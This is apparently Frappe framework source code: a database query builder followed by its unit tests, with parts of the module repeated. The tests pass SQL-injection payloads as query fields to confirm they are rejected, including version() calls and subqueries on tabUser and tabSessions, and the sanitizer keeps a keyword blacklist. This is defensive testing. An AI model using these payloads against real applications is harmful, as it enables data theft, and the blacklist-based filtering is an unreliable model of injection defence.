		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt
from __future__ import unicode_literals

import frappe, unittest

from frappe.model.db_query import DatabaseQuery
from frappe.desk.reportview import get_filters_cond

class TestReportview(unittest.TestCase):
	def test_basic(self):
		self.assertTrue({"name":"DocType"} in DatabaseQuery("DocType").execute(limit_page_length=None))

	def test_fields(self):
		self.assertTrue({"name":"DocType", "issingle":0} \
			in DatabaseQuery("DocType").execute(fields=["name", "issingle"], limit_page_length=None))

	def test_filters_1(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters=[["DocType", "name", "like", "J%"]]))

	def test_filters_2(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters=[{"name": ["like", "J%"]}]))

	def test_filters_3(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters={"name": ["like", "J%"]}))

	def test_filters_4(self):
		self.assertTrue({"name":"DocField"} \
			in DatabaseQuery("DocType").execute(filters={"name": "DocField"}))

	def test_in_not_in_filters(self):
		self.assertFalse(DatabaseQuery("DocType").execute(filters={"name": ["in", None]}))
		self.assertTrue({"name":"DocType"} \
				in DatabaseQuery("DocType").execute(filters={"name": ["not in", None]}))

		for result in [{"name":"DocType"}, {"name":"DocField"}]:
			self.assertTrue(result
				in DatabaseQuery("DocType").execute(filters={"name": ["in", 'DocType,DocField']}))

		for result in [{"name":"DocType"}, {"name":"DocField"}]:
			self.assertFalse(result
				in DatabaseQuery("DocType").execute(filters={"name": ["not in", 'DocType,DocField']}))

	def test_or_filters(self):
		data = DatabaseQuery("DocField").execute(
				filters={"parent": "DocType"}, fields=["fieldname", "fieldtype"],
				or_filters=[{"fieldtype":"Table"}, {"fieldtype":"Select"}])

		self.assertTrue({"fieldtype":"Table", "fieldname":"fields"} in data)
		self.assertTrue({"fieldtype":"Select", "fieldname":"document_type"} in data)
		self.assertFalse({"fieldtype":"Check", "fieldname":"issingle"} in data)

	def test_between_filters(self):
		""" test case to check between filter for date fields """
		frappe.db.sql("delete from tabEvent")

		# create events to test the between operator filter
		todays_event = create_event()
		event1 = create_event(starts_on="2016-07-05 23:59:59")
		event2 = create_event(starts_on="2016-07-06 00:00:00")
		event3 = create_event(starts_on="2016-07-07 23:59:59")
		event4 = create_event(starts_on="2016-07-08 00:00:01")

		# if the values are not passed in filters then event should be filter as current datetime
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", None]}, fields=["name"])

		self.assertTrue({ "name": event1.name } not in data)

		# if both from and to_date values are passed
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", ["2016-07-06", "2016-07-07"]]},
			fields=["name"])

		self.assertTrue({ "name": event2.name } in data)
		self.assertTrue({ "name": event3.name } in data)
		self.assertTrue({ "name": event1.name } not in data)
		self.assertTrue({ "name": event4.name } not in data)

		# if only one value is passed in the filter
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", ["2016-07-07"]]},
			fields=["name"])

		self.assertTrue({ "name": event3.name } in data)
		self.assertTrue({ "name": event4.name } in data)
		self.assertTrue({ "name": todays_event.name } in data)
		self.assertTrue({ "name": event1.name } not in data)
		self.assertTrue({ "name": event2.name } not in data)

	def test_ignore_permissions_for_get_filters_cond(self):
		frappe.set_user('test1@example.com')
		self.assertRaises(frappe.PermissionError, get_filters_cond, 'DocType', dict(istable=1), [])
		self.assertTrue(get_filters_cond('DocType', dict(istable=1), [], ignore_permissions=True))
		frappe.set_user('Administrator')

	def test_query_fields_sanitizer(self):
		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
				fields=["name", "issingle, version()"], limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, IF(issingle=1, (select name from tabUser), count(name))"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, (select count(*) from tabSessions)"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, SELECT LOCATE('', `tabUser`.`user`) AS user;"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, IF(issingle=1, (SELECT name from tabUser), count(*))"],
			limit_start=0, limit_page_length=1)

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "count(name)"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('count(name)' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "locate('', name) as _relevance"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('_relevance' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "date(creation) as creation"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('creation' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle",
			"datediff(modified, creation) as date_diff"], limit_start=0, limit_page_length=1)
		self.assertTrue('date_diff' in data[0])

def create_event(subject="_Test Event", starts_on=None):
	""" create a test event """

	from frappe.utils import get_datetime

	event = frappe.get_doc({
		"doctype": "Event",
		"subject": subject,
		"event_type": "Public",
		"starts_on": get_datetime(starts_on),
	}).insert(ignore_permissions=True)

	return event                    


# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']                    
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)                    

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):
				_raise_exception()

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
